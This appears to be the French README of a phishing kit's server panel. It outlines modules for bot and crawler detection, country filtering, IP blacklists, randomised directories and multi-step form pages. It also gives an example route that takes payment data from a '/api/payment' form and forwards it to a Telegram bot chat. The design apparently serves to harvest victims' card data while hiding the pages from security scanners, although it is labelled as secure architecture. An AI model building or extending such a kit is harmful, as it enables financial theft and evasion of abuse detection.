# 🏗️ Architecture sécurisée du projet

## Structure des répertoires

```text
server/secure/
├── config/
│   └── config.ts                # Configuration centrale (Telegram, hCaptcha)
├── panel/                        # Modules de sécurité et gestion
│   ├── ip-manager.ts            # Gestion whitelist/blacklist IP
│   ├── geo-filter.ts             # Filtrage géographique
│   ├── bot-detection.ts          # Détection de bots (hub)
│   ├── rate-limiter.ts           # Limitation de débit
│   └── visitor-manager.ts        # Gestion des visiteurs uniques
├── views/                        # Pages du formulaire (étapes)
│   └── (à venir: pages React organisées ici)
├── app/
│   └── send.ts                   # Envoi des données vers Telegram
└── index.ts                      # Gestion des répertoires randomisés
```

## Modules de sécurité

### `config/config.ts`
Configuration centrale pour :
- Telegram (token, chatId)
- hCaptcha (optionnel)
- Pays autorisés
- Secret de session

### `panel/ip-manager.ts`
- Récupération de l'IP réelle (gestion des proxies/CDN)
- Gestion des whitelist/blacklist
- Normalisation IPv6 → IPv4

### `panel/geo-filter.ts`
- Géolocalisation IP via plusieurs services
- Filtrage par pays autorisés
- Gestion des ASN spéciaux

### `panel/bot-detection.ts`
- Détection basée sur User-Agent
- Analyse des headers HTTP
- Score de suspicion (0-100)

### `panel/rate-limiter.ts`
- Limitation de débit par IP
- Middleware Express
- Nettoyage automatique

### `panel/visitor-manager.ts`
- Suivi des visiteurs uniques
- Génération d'ID basé sur IP + User-Agent
- Statistiques des visiteurs

### `app/send.ts`
- Envoi sécurisé vers Telegram
- Formatage des messages
- Gestion des erreurs

## Utilisation

### Configuration

Les variables d'environnement suivantes peuvent être définies :

```env
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
HCAPTCHA_SECRET_KEY=your_secret_key
HCAPTCHA_SITE_KEY=your_site_key
ALLOWED_COUNTRIES=US,CA,GB,FR
SESSION_SECRET=your_secret_key
```

### Exemple d'utilisation

```typescript
import { getRealIp } from "./secure/panel/ip-manager";
import { sendToTelegram } from "./secure/app/send";
import { checkRateLimit } from "./secure/panel/rate-limiter";

// Dans une route Express
app.post("/api/payment", (req, res) => {
  const ip = getRealIp(req);
  const rateLimit = checkRateLimit(req);
  
  if (!rateLimit.allowed) {
    return res.status(429).json({ error: "Rate limit exceeded" });
  }
  
  // ... traitement ...
  
  await sendToTelegram(paymentData, req);
});
```

## Notes

- Les modules sont conçus pour être modulaires et réutilisables
- La détection de bots peut être étendue avec d'autres modules (fingerprint, behavior analysis, etc.)
- Les whitelist/blacklist sont stockées dans `whitelist.txt` et `blacklist.txt` à la racine du projet
